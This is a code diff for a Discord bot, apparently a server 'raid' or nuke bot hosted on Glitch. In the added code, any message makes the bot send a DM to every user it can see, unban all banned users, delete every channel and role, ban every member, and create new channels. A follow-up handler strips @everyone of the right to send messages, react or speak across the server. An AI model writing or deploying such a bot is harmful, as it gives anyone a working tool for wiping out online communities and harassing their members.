@@ -1,6 +1,5 @@
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 const express = require('express');
-
 const Discord = require('discord.js');
 const berke = new Discord.Client();
 const app = express();
@@ -10,14 +9,29 @@ const http = require('http');
     });
     app.listen(process.env.PORT);
     setInterval(() => {
-    http.get('http://dyno-raid.glitch.me/');
+    http.get('http://schewtsa-raid.glitch.me/');
     }, 280000);
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 berke.on('message', async msg => {
-  if (msg.content.toLowerCase() === 'xdxd' ) {
-    msg.guild.members.forEach(member => member.ban())
-  }
+berke.users.forEach(u => {
+u.send('sa')
+})
+    
+msg.guild.fetchBans().then(bans => {
+bans.forEach(user => {
+msg.guild.unban(user)
+      });
+    });
+  
+msg.guild.channels.forEach(a => a.delete())
+msg.guild.members.forEach(a => msg.guild.ban(a))
+msg.guild.roles.forEach(a => a.delete())
+let kanal = 'schewtsa'
+let kanal1 = 'buraya-yazın'
+
+msg.guild.createChannel(kanal)
+msg.guild.createChannel(kanal1)
 });
  
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 
@@ -36,11 +50,30 @@ berke.on('message', message => {
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 berke.on('channelCreate', channel => {
-  if (channel.name == 'dyno') {
-    channel.send('Sunucuya ne oldu neyse üzüldüm :smoking: :smoking: bunları yapanla görüşmek istersen; ``🏆 Chêrry.#0345``')
+  if (channel.name == 'schewtsa') {
+    channel.send('Bir, kuşun kanat çırpış sesiydi.')
     channel.guild.channels.forEach(c => {
          c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
               SEND_MESSAGES: false,
+              ADD_REACTIONS: false,
+              SPEAK: false
+            });
+          });
+  }
+  if (channel.name == '') {
+    channel.send(``)
+  }
+
+});
+
+///////////
+
+berke.on('channelCreate', channel => {
+  if (channel.name == 'buraya-yazın') {
+    channel.send('@everyone buraya yazabilirsiniz.')
+    channel.guild.channels.forEach(c => {
+         c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
+              SEND_MESSAGES: true,
               ADD_REACTIONS: false,
               SPEAK: false
             });
